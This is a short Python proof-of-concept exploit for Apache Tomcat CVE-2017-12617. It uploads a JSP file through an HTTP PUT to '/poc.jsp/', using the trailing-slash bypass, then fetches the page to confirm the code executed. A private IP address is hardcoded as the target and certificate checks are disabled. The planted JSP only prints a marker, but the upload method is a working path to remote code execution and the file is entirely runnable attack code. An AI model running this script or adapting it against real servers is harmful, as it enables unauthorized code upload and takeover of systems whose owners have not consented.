import requests
requests.packages.urllib3.disable_warnings()

def run(url):
    payload = '<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }
    requests.packages.urllib3.disable_warnings()
    try:
        req = requests.put(url+'/poc.jsp'+'/', data=payload, headers=headers, verify=False)
        if req.status_code == 201 or req.status_code == 204:
            conn = requests.get(url+'/poc.jsp', headers=headers, verify=False)
            if conn.status_code == 200:
                if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in conn.content.decode():
                    return 'tomcat CVE-2017-12617 Vulnerable'
                else:
                    return False
    except Exception as e:
        return False

if __name__ == '__main__':
    print(run("http://172.16.134.232:8080"))